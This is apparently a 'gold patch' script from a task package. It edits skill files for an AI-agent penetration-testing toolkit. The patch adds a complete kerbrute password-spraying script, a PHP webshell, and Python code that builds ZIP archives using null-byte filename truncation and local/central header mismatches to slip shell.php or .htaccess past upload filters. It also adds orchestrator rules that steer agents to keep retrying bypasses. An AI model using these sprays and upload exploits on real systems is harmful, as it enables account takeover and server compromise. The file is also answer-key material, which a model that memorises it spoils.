#!/usr/bin/env bash
set -euo pipefail

cd /workspace/red-run

# Idempotency guard
if grep -qF "echo \"[*] Round 2: context wordlist ($(wc -l < \"$WORDLIST\") passwords)\" | tee -a" "skills/credential/password-spraying/SKILL.md" && grep -qF "- That the host appears unreachable or has no open ports in the scanned range" "skills/network/network-recon/SKILL.md" && grep -qF "The technique skill contains curated bypass sequences (alternative extensions," "skills/orchestrator/SKILL.md" && grep -qF "Where `shell.php` contains a standard webshell (`<?php system($_GET['cmd']); ?>`" "skills/web/file-upload-bypass/SKILL.md" && grep -qF "> **\u2192 ROUTE ON HIT:** Uploaded file executed server-side \u2192 **file-upload-bypass*" "skills/web/web-discovery/SKILL.md"; then
  echo "Gold patch already applied."
  exit 0
fi

git apply --whitespace=nowarn <<'PATCH'
diff --git a/skills/credential/password-spraying/SKILL.md b/skills/credential/password-spraying/SKILL.md
@@ -415,7 +415,8 @@ passwords).
 ### Service Protocol Commands
 
 Use `nxc` (netexec) for all supported protocols. Only fall back to `hydra`
-for protocols netexec does not support.
+for protocols netexec does not support, or `kerbrute` for Kerberos-only
+environments (see NTLM-Disabled Environments below).
 
 ```bash
 # SMB (most common)
@@ -456,6 +457,34 @@ skipped. Without it, nxc tests all combinations (every password against every
 user), which is what spray mode requires. Use lockout-aware pacing (below)
 to stay safe.
 
+### NTLM-Disabled Environments
+
+When NTLM is disabled (STATUS_NOT_SUPPORTED on SMB/LDAP auth), the default
+nxc spray script will fail. Two options:
+
+**Option A — nxc with Kerberos (preferred, simpler):**
+
+Add `--kerberos` to all nxc commands in the spray script. nxc handles
+Kerberos authentication natively — no script restructuring needed:
+
+```bash
+nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN --kerberos
+nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success --kerberos
+```
+
+This is a drop-in flag — the spray script template works as-is with this
+addition. Use this approach when the operator selected nxc-compatible
+services (SMB, LDAP, WinRM).
+
+**Option B — kerbrute loop (Kerberos pre-auth, stealthier):**
+
+Use the kerbrute spray script variant (see below). Generates Event 4771
+instead of 4625. Use when OPSEC matters or when nxc Kerberos auth fails.
+
+**Detection:** If the orchestrator context mentions NTLM disabled, Kerberos-
+only, or STATUS_NOT_SUPPORTED, you MUST use one of these approaches. Do not
+attempt standard nxc commands without `--kerberos` — they will silently fail.
+
 ## Lockout-Aware Spray Pacing
 
 If the lockout policy has a non-zero threshold, pace the spray to avoid
@@ -490,11 +519,108 @@ engagements where OPSEC is not a concern, netexec is simpler and preferred.
 
 ### kerbrute (Kerberos Pre-Auth)
 
+**CRITICAL: `kerbrute passwordspray` takes a SINGLE password string, NOT a
+wordlist file.** Passing a file path as the password argument will literally
+test the file path string as the password (e.g., trying the password
+`/home/user/wordlist.txt` against all users). This is silent, wrong, and
+wastes the entire spray.
+
+Single password usage:
 ```bash
 kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
-  users.txt 'Spring2026!' -v -o spray-round1.log
+  users.txt 'Spring2026!' -v
 ```
 
+**To spray a wordlist with kerbrute, loop through it:**
+
+```bash
+while IFS= read -r pass || [[ -n "$pass" ]]; do
+    [[ -z "$pass" || "$pass" == \#* ]] && continue
+    kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
+      users.txt "$pass" 2>&1 | tee -a spray-results.txt
+done < wordlist.txt
+```
+
+#### Kerbrute Spray Script Variant
+
+When using kerbrute instead of nxc (NTLM-disabled environments or OPSEC-
+sensitive engagements), generate this spray script variant:
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+# === Configuration (agent fills these from orchestrator context) ===
+TARGET_DC="DC01.DOMAIN.LOCAL"
+DOMAIN="DOMAIN.LOCAL"
+USERFILE="engagement/evidence/usernames.txt"
+WORDLIST="engagement/evidence/wordlist.txt"
+RESULTS="engagement/evidence/spray-results.txt"
+SECLISTS_FILE="SECLISTS_PATH"
+
+# === Helper: spray one password against all users ===
+spray_one() {
+    local pass="$1"
+    kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET_DC" \
+      "$USERFILE" "$pass" 2>&1
+}
+
+# === Spray Execution ===
+> "$RESULTS"
+
+echo "========================================" | tee -a "$RESULTS"
+echo "[*] Kerbrute spray — $(wc -l < "$USERFILE") users" | tee -a "$RESULTS"
+echo "========================================" | tee -a "$RESULTS"
+
+# Round 1: Username-as-password
+echo "[*] Round 1: username-as-password" | tee -a "$RESULTS"
+while IFS= read -r user || [[ -n "$user" ]]; do
+    [[ -z "$user" ]] && continue
+    spray_one "$user" | tee -a "$RESULTS"
+done < "$USERFILE"
+echo "" | tee -a "$RESULTS"
+
+# Round 2: Context wordlist
+echo "[*] Round 2: context wordlist ($(wc -l < "$WORDLIST") passwords)" | tee -a "$RESULTS"
+while IFS= read -r pass || [[ -n "$pass" ]]; do
+    [[ -z "$pass" || "$pass" == \#* ]] && continue
+    spray_one "$pass" | tee -a "$RESULTS"
+done < "$WORDLIST"
+echo "" | tee -a "$RESULTS"
+
+# Round 3: SecLists wordlist
+if [[ -f "$SECLISTS_FILE" ]]; then
+    total=$(wc -l < "$SECLISTS_FILE")
+    echo "[*] Round 3: SecLists ($total passwords)" | tee -a "$RESULTS"
+    count=0
+    while IFS= read -r pass || [[ -n "$pass" ]]; do
+        [[ -z "$pass" || "$pass" == \#* ]] && continue
+        spray_one "$pass" | tee -a "$RESULTS"
+        count=$((count + 1))
+        if (( count % 100 == 0 )); then
+            echo "[*] Progress: $count / $total" | tee -a "$RESULTS"
+        fi
+    done < "$SECLISTS_FILE"
+    echo "" | tee -a "$RESULTS"
+else
+    echo "[!] SecLists file not found: $SECLISTS_FILE" | tee -a "$RESULTS"
+fi
+
+echo "========================================" | tee -a "$RESULTS"
+echo "[*] Spray complete" | tee -a "$RESULTS"
+echo "" | tee -a "$RESULTS"
+echo "=== VALID CREDENTIALS ===" | tee -a "$RESULTS"
+grep -i 'valid pass' "$RESULTS" 2>/dev/null || echo "(none found)" | tee -a "$RESULTS"
+```
+
+**When to use this variant instead of the nxc script:**
+- NTLM disabled and `nxc --kerberos` fails or is unavailable
+- OPSEC-sensitive engagement (generates 4771 instead of 4625)
+- Operator explicitly requests kerbrute
+
+**Execute the same way** — write via Write tool, `chmod +x`, run via
+`start_process`.
+
 ### Hash Spray (Lateral Movement)
 
 When you have a recovered NTLM hash, spray it across targets:
diff --git a/skills/network/network-recon/SKILL.md b/skills/network/network-recon/SKILL.md
@@ -262,6 +262,26 @@ version detection, script scanning, and traceroute. `-p-` scans all 65535
 ports. `-T4` is aggressive timing suitable for most networks. `-oA` saves in
 all formats (`.nmap`, `.gnmap`, `.xml`).
 
+### Host Appears Down — `-Pn` Retry
+
+If the scan returns **0 hosts up** (nmap's host discovery probes got no
+response), retry with `-Pn` added to the **same scan options**. Many targets
+(especially HTB/CTF, cloud instances, and firewalled hosts) block ICMP and
+TCP discovery probes but have open ports.
+
+**Rules:**
+- Add `-Pn` to the ORIGINAL scan options. Do NOT change the scan type, port
+  range, or any other flags. If the operator chose quick (`--top-ports 1000`),
+  retry as quick + `-Pn`. If full (`-p-`), retry as full + `-Pn`.
+- This retry happens **once**. If the `-Pn` scan also returns no open ports,
+  **STOP and return to the orchestrator** with:
+  - What was tried (both scans with exact options)
+  - That the host appears unreachable or has no open ports in the scanned range
+  - A recommendation to check network connectivity (VPN, routing, firewall)
+- Do NOT escalate to a different scan type (e.g., quick → full). Do NOT add
+  `-p-` to a quick scan. Do NOT run additional scans beyond the one `-Pn`
+  retry. The orchestrator decides next steps — not you.
+
 **Parse scan results:**
 
 ```bash
@@ -968,7 +988,11 @@ OS, any credentials or access found, current mode.
 ### Nmap scan runs slowly or hangs
 - Use `-T4` for speed. Drop to `-T3` if getting rate-limited or missing ports.
 - On large subnets, start with `--top-ports 1000` before doing `-p-`.
-- If host seems down but you know it's up, add `-Pn` to skip host discovery.
+
+### Host appears down (0 hosts up)
+- Retry with `-Pn` added to the same scan options (see "Host Appears Down"
+  in Step 2). Do NOT change the scan type or port range.
+- If `-Pn` also finds nothing, return to orchestrator — do not improvise.
 
 ### UDP scan takes too long
 - UDP scans are inherently slow. Limit to key ports: `-sU -p 53,67,69,123,161,162,500,623,1434,5353`.
diff --git a/skills/orchestrator/SKILL.md b/skills/orchestrator/SKILL.md
@@ -178,6 +178,22 @@ The agent will:
 3. Report findings and return — the orchestrator records state changes and decides what to invoke next
 4. Return a summary of findings and routing recommendations
 
+**Context passing — do NOT override skill methodology.** When routing to a
+technique agent, pass discovery-phase findings as **informational context**,
+not as directives to skip techniques. The skill's methodology determines what
+to try — the orchestrator provides context, not restrictions.
+
+- **WRONG:** *"Do NOT attempt PHP webshell uploads — they are blocked by
+  content inspection."*
+- **RIGHT:** *"Discovery found: basic PHP content (<?php) is blocked by
+  content inspection. PHP short tags also blocked. The skill's full bypass
+  methodology has not been tested yet."*
+
+The technique skill contains curated bypass sequences (alternative extensions,
+config file uploads, magic bytes, polyglots, etc.) that the discovery agent
+never tested. Telling the agent to skip a technique class defeats the purpose
+of routing to the skill in the first place.
+
 **After every subagent return:**
 1. Parse the agent's return summary for new targets, creds, access, vulns, pivots, blocked items
 2. Call structured write tools to record findings (`add_target`, `add_credential`, `add_vuln`, etc.)
@@ -296,7 +312,21 @@ When a skill completes and returns control to the orchestrator:
    - Access gained/changed → `add_access()` / `update_access()`
    - Vulnerabilities confirmed → `add_vuln()` / `update_vuln()`
    - Pivot paths identified → `add_pivot()`
-   - Failed techniques → `add_blocked()`
+   - Failed techniques → `add_blocked()` — **see retry policy below**
+   - **Retry policy for blocked techniques from discovery agents:**
+     Discovery agents (web-discovery, ad-discovery, network-recon,
+     linux-discovery, windows-discovery) perform preliminary testing with
+     basic payloads. They are NOT equipped with the full bypass methodology
+     of technique skills. When a discovery agent reports a technique as
+     blocked (e.g., "PHP upload blocked by content inspection"), **always
+     record with `retry: "with_context"`** — never `retry: "no"`. The
+     corresponding technique skill (e.g., file-upload-bypass) has
+     comprehensive bypass methodology (alternative extensions, .htaccess,
+     magic bytes, polyglots, double extensions, etc.) that discovery agents
+     don't test. Only a technique skill can definitively confirm a
+     technique is blocked. Mark `retry: "no"` only when a **technique
+     agent** (web-exploit, ad-exploit, linux-privesc, windows-privesc)
+     exhausts its skill's methodology and still fails.
 3. Append to `engagement/activity.md` with skill outcome
 4. Append to `engagement/findings.md` if vulnerabilities were confirmed
 5. **Check for new usernames** — if the skill returned usernames not
@@ -772,8 +802,19 @@ When reading the state summary (via `get_state_summary()`), the orchestrator sho
    abuse toward the same account), race them in parallel via the fork
    mechanism.
 6. **Check pivot map** — are there identified paths not yet followed?
-7. **Check blocked items** — has anything changed that might unblock a
-   previously failed technique?
+7. **Check blocked items** — two categories:
+   a. **`retry: "with_context"`** — these are techniques blocked at the
+      discovery phase that have a corresponding technique skill with deeper
+      bypass methodology. Route to the technique skill and let it exhaust
+      its full methodology before accepting the block. Example: web-discovery
+      reports "PHP upload blocked by content inspection" → route to
+      web-exploit-agent with `file-upload-bypass` to try alternative
+      extensions, .htaccess, magic bytes, polyglots, etc.
+   b. **`retry: "later"`** — context has changed (new credentials, new
+      access, different network position). Retry with updated context.
+   c. **`retry: "no"`** — technique skill exhausted its methodology. Only
+      revisit if fundamentally new access is gained (e.g., admin creds,
+      different host).
 8. **Assess progress toward objectives** — are we closer to the goal defined
    in scope.md?
 9. **No hardcoded route matches** — if the scenario doesn't match any routing
diff --git a/skills/web/file-upload-bypass/SKILL.md b/skills/web/file-upload-bypass/SKILL.md
@@ -17,6 +17,9 @@ keywords:
   - .htaccess upload
   - web.config upload
   - double extension
+  - zip null byte
+  - zip filename truncation
+  - zip header mismatch
 tools:
   - burpsuite
   - exiftool
@@ -132,14 +135,20 @@ shell.jpg.php          # Executes as PHP when AddHandler matches .php anywhere
 
 ### Null Byte Injection
 
-Works on older systems (PHP < 5.3.4, some Java implementations):
+Works on older systems (PHP < 5.3.4, some Java implementations) for direct
+uploads:
 
 ```
 shell.php%00.jpg       # URL-encoded null byte
 shell.php\x00.jpg      # Literal null byte in multipart data
 shell.php%00.png%00.jpg
 ```
 
+**Important**: Null bytes in direct upload filenames require old PHP, but null
+bytes inside **ZIP entry filenames** work against modern PHP because truncation
+happens at the filesystem/extraction level, not PHP string handling. See
+Step 6 → ZIP Null Byte Filename Truncation.
+
 ### Case Variation
 
 Bypass case-sensitive blacklists:
@@ -361,6 +370,137 @@ ln -s /etc/passwd symlink.txt
 zip --symlinks payload.zip symlink.txt
 ```
 
+### ZIP Null Byte Filename Truncation
+
+When a server extracts uploaded ZIP archives and checks entry names for
+blocked extensions, inject a null byte into the ZIP entry filename so the
+filter sees an allowed extension (`.pdf`) but the filesystem truncates at
+the null byte and writes a dangerous extension (`.php`).
+
+**Why this works on modern PHP**: The extension filter checks the filename as
+a PHP string (null byte is a valid character, name ends in `.pdf`). But when
+`ZipArchive::extractTo()` calls the underlying C library to write the file,
+the C string is truncated at the null byte — the file lands as `shell.php`.
+This is NOT the same as null bytes in direct upload filenames (patched in
+PHP 5.3.4) — this exploits the PHP/C boundary during ZIP extraction.
+
+**Step 1** — Create a ZIP with a double-dot placeholder in the filename:
+
+```python
+import zipfile
+
+with zipfile.ZipFile("payload.zip", "w") as zf:
+    # arcname has double dot: file.php..pdf
+    # The second dot will be replaced with \x00 via hex edit
+    zf.write("shell.php", arcname="file.php..pdf")
+```
+
+Where `shell.php` contains a standard webshell (`<?php system($_GET['cmd']); ?>`).
+The content filter typically does not scan for PHP tags when the entry name
+ends in `.pdf`.
+
+**Step 2** — Hex-edit the ZIP to replace the second `.` with a null byte
+(`\x00`). The filename `file.php..pdf` appears twice in the ZIP: once in the
+**local file header** and once in the **central directory entry**. Replace the
+`.` before `pdf` with `\x00` in **both** locations:
+
+```
+Before: 66 69 6C 65 2E 70 68 70 2E 2E 70 64 66   file.php..pdf
+After:  66 69 6C 65 2E 70 68 70 2E 00 70 64 66   file.php.\x00pdf
+```
+
+Use any hex editor (`hexeditor`, `xxd`, `printf` with `dd`). Automated:
+
+```python
+# Read the ZIP, replace the second dot with null byte
+with open("payload.zip", "rb") as f:
+    data = f.read()
+
+# Replace both occurrences (local header + central directory)
+data = data.replace(b"file.php..pdf", b"file.php.\x00pdf")
+
+with open("payload.zip", "wb") as f:
+    f.write(data)
+```
+
+**Step 3** — Verify the archive entry name is truncated:
+
+```bash
+unzip -l payload.zip
+# Should show: file.php   (truncated at null byte)
+```
+
+**Step 4** — Upload. The server's extension filter reads the full bytes
+including the null, sees `.pdf` at the end, and allows it. Extraction
+truncates at the null byte and writes `file.php` to disk. The URL may
+include `%20` or other artifacts from null byte handling — try both the
+clean name and the URL-encoded variant:
+
+```
+http://target.com/uploads/file.php
+http://target.com/uploads/file.php%20
+```
+
+**When to use**: Server extracts ZIP uploads, checks entry names for blocked
+extensions, and extracted files are web-accessible. The extension filter is
+the primary defense (content inspection may or may not be present). This
+bypasses both extension whitelists and blacklists because the filter never
+sees `.php` — it sees `.pdf`.
+
+### ZIP Local/Central Header Mismatch
+
+ZIP files store each filename in two places: the **local file header** (at the
+file data) and the **central directory entry** (at the end of the archive).
+Most PHP/Java ZIP libraries read filenames from the central directory, but some
+extraction implementations write files using local header names. If the
+server's filter checks central directory names but extracts using local header
+names, use different filenames in each location.
+
+```python
+import struct
+
+def local_header(filename, data):
+    """Build a local file header with the REAL filename."""
+    return struct.pack('<4sHHHHHIIIHH',
+        b'PK\x03\x04', 20, 0, 0, 0, 0, 0,
+        len(data), len(data), len(filename), 0) + filename + data
+
+def central_entry(filename, offset, data):
+    """Build a central directory entry with the FAKE filename."""
+    return struct.pack('<4sHHHHHHIIIHHHHHII',
+        b'PK\x01\x02', 20, 20, 0, 0, 0, 0, 0,
+        len(data), len(data), len(filename), 0, 0, 0, 0, 0, offset) + filename
+
+# Local header: real filename (.php or .htaccess)
+# Central dir: innocuous filename (.pdf)
+payload = b'<?php system($_GET["cmd"]); ?>'
+local = local_header(b'shell.php', payload)
+central = central_entry(b'report.pdf', 0, payload)
+
+eocd = struct.pack('<4sHHHHIIH',
+    b'PK\x05\x06', 0, 0, 1, 1,
+    len(central), len(local), 0)
+
+with open('mismatch.zip', 'wb') as f:
+    f.write(local + central + eocd)
+```
+
+The filter reads the central directory, sees `report.pdf`, and allows the
+upload. Extraction uses the local header and writes `shell.php` to disk.
+
+**Variant — plant .htaccess**: Use local=`.htaccess` with
+`AddType application/x-httpd-php .pdf`, central=`styles.css`. If
+`AllowOverride` is enabled, subsequent `.pdf` uploads execute as PHP.
+
+**When to use**: Server extracts ZIPs and the filter checks central directory
+names. Test with `.htaccess` first (low risk, confirms the mismatch works)
+before trying `.php` (higher value, confirms execution).
+
+**Limitation**: Only works when the extraction implementation reads local
+headers. PHP's `ZipArchive` typically uses central directory names. Some
+custom extraction code, Java's `ZipInputStream`, or C-level libraries may
+use local headers. Test empirically.
+
 ### Filename Injection
 
 If uploaded filenames are used in server-side operations without sanitization:
@@ -419,7 +559,7 @@ Minimal payloads for each language — use after achieving a bypass.
 <?php system($_GET['cmd']); ?>
 # PHP — minimal (17 bytes)
 <?=`$_GET[0]`?>
-# PHP — if <?php blocked
+# PHP — if <?php blocked (PHP < 7.0 ONLY — removed in 7.0)
 <script language="php">system($_GET['cmd']);</script>
 # PHP — if system() blocked: shell_exec(), passthru(), backticks
 
@@ -575,6 +715,10 @@ then re-invoke this skill with the AV-safe artifact.
 - Check if the upload directory has execution disabled (try path traversal in
   the filename to write elsewhere: `../shell.php`)
 - Try config file upload to re-enable execution in the upload directory
+- If the server extracts ZIPs: try ZIP null byte filename truncation (Step 6)
+  to land a `.php` file despite extension filtering — the extension filter sees
+  `.pdf` but extraction writes `.php`, which Apache processes natively without
+  needing `.htaccess` overrides
 
 ### Image Validation Passes but PHP Stripped
 
diff --git a/skills/web/web-discovery/SKILL.md b/skills/web/web-discovery/SKILL.md
@@ -361,7 +361,7 @@ echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
 # .htaccess (Apache), web.config (IIS), .user.ini (PHP-FPM)
 ```
 
-> **→ ROUTE ON HIT:** Uploaded file executed server-side → **file-upload-bypass**. Alternative extension accepted → **file-upload-bypass**. Config file accepted (`.htaccess`, `web.config`) → **file-upload-bypass** (config exploitation).
+> **→ ROUTE ON HIT:** Uploaded file executed server-side → **file-upload-bypass**. Alternative extension accepted → **file-upload-bypass**. Config file accepted (`.htaccess`, `web.config`) → **file-upload-bypass** (config exploitation). **Upload endpoint found but execution blocked** → **file-upload-bypass** (discovery-phase testing is preliminary — the technique skill has comprehensive bypass methodology including alternative extensions, .htaccess/.web.config upload, magic bytes, polyglots, and archive tricks that discovery does not exhaustively test).
 
 **NoSQL Injection** (test JSON APIs and Node.js backends):
 ```
@@ -657,6 +657,7 @@ execute exploitation commands inline — even if the technique seems simple.
 | Uploaded file executed server-side | **file-upload-bypass** |
 | Extension blocked but alternative accepted | **file-upload-bypass** |
 | Config file upload accepted (.htaccess, web.config) | **file-upload-bypass** (config exploitation) |
+| Upload endpoint found, basic server-side content blocked | **file-upload-bypass** (discovery testing is preliminary — technique skill has 20+ bypass variants) |
 
 ### Request Smuggling
 
PATCH

echo "Gold patch applied."
